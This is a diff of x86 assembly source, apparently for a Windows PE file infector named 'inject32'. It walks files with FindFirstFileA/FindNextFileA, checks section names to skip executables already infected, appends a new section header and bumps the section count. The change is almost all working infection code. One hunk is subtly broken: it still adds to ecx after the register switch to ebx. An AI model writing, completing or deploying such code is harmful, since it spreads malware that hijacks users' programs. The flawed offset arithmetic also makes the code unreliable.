@@ -4,7 +4,7 @@ inject32 SEGMENT read write execute
 	data_start EQU $
 	
 	; .data
-    selfSectionVA dd 2000h
+    selfSectionVA dd 3000h
 
     strF1A db 'FindFirstFileA', 0
     strFNA db 'FindNextFileA', 0
@@ -216,18 +216,6 @@ start:
 		getval fromStack(tgHand), 2, SEEK_SET, ebx
 		mov eax, paccess(tempDword)
 		toStack NumberOfSections
-		inc paccess(tempDword)
-			push SEEK_SET
-			push 0
-			push ebx
-			push fromStack(tgHand)
-		call vfromStack(fseek)
-			push 0
-			push daccess(tempDword2)
-			push 2
-			push daccess(tempDword)
-			push fromStack(tgHand)
-		call vfromStack(fwrite)
 
 		add ebx, 20 - 6                                 ; (WORD at e_lfanew + 20)
 		getval fromStack(tgHand), 2, SEEK_SET, ebx
@@ -256,19 +244,51 @@ start:
 		mov eax, paccess(tempDword)
 		toStack FileAlignment
 
+		; Search for an already in-place injection
+		mov ebx, fromStack(ioh_offset)
+		add ebx, fromStack(SizeOfOptionalHeader) ; ebx = Section Table Offset
+			push SEEK_SET
+			push 0
+			push ebx
+			push fromStack(tgHand)
+		call vfromStack(fseek)
+		mov ebx, fromStack(NumberOfSections)
+		already_injected_loop:
+				push 0
+				push daccess(tempDword2)
+				push 8
+				push daccess(temp320B)
+				push fromStack(tgHand)
+			call vfromStack(fread)
+			mov esi, daccess(temp320B, esi)
+			mov edi, daccess(ishName, edi)
+			mov ecx, 8
+			cld
+			repe cmpsb
+			jz closeFile
+			
+				push SEEK_CUR
+				push 0
+				push 32
+				push fromStack(tgHand)
+			call vfromStack(fseek)
+			dec ebx
+			cmp ebx, 0
+		ja already_injected_loop
+
 		; Calculate new section address
 		; DWORD lastish_offset = ioh_offset + SizeOfOptionalHeader + 40 * (NumberOfSections - 1);
-		mov ecx, fromStack(ioh_offset)
-		add ecx, fromStack(SizeOfOptionalHeader)
+		mov ebx, fromStack(ioh_offset)
+		add ebx, fromStack(SizeOfOptionalHeader)
 		mov edx, fromStack(NumberOfSections)
 		dec edx
 		imul edx, 40 ; Size of 1 section header
 		add ecx, edx
-		toStack lastish_offset, ecx
+		toStack lastish_offset, ebx
 
 		; Obtain lastish.VirtualAddress
-		add ecx, 12
-		getval fromStack(tgHand), 4, SEEK_SET, ecx
+		add ebx, 12
+		getval fromStack(tgHand), 4, SEEK_SET, ebx
 		mov ebx, paccess(tempDword)
 
 		; Obtain lastish.SizeOfRawData
@@ -401,6 +421,24 @@ start:
 			push daccess(tempDword2)
 			push 40
 			push daccess(ishName, ecx)
+			push fromStack(tgHand)
+		call vfromStack(fwrite)
+
+		; Increase NumberOfSections
+		mov ecx, vfromStack(NumberOfSections)
+		mov paccess(tempDword), ecx
+		inc paccess(tempDword)
+		mov ebx, vfromStack(lfanew)
+		add ebx, 6
+			push SEEK_SET
+			push 0
+			push ebx
+			push fromStack(tgHand)
+		call vfromStack(fseek)
+			push 0
+			push daccess(tempDword2)
+			push 2
+			push daccess(tempDword)
 			push fromStack(tgHand)
 		call vfromStack(fwrite)
 
